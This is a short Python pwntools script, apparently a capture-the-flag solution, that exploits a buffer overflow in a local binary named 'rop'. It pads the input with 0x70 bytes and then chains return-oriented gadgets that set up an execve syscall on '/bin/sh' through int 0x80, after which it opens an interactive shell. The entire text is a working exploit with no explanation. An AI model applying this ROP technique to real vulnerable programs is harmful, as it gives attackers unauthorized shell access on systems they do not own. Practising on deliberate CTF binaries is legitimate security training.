
from pwn import *

eax_addr = 0x080bb196
edcbx_addr = 0x0806eb90
binsh_addr = 0x080be408
int80_addr = 0x08049421

payload = flat(['a'*0x70,eax_addr,0xb,edcbx_addr,0,0,binsh_addr,int80_addr])
print(len(payload))
p = process('./rop')
p.sendlineafter("What do you plan to do?\n", payload)
p.interactive()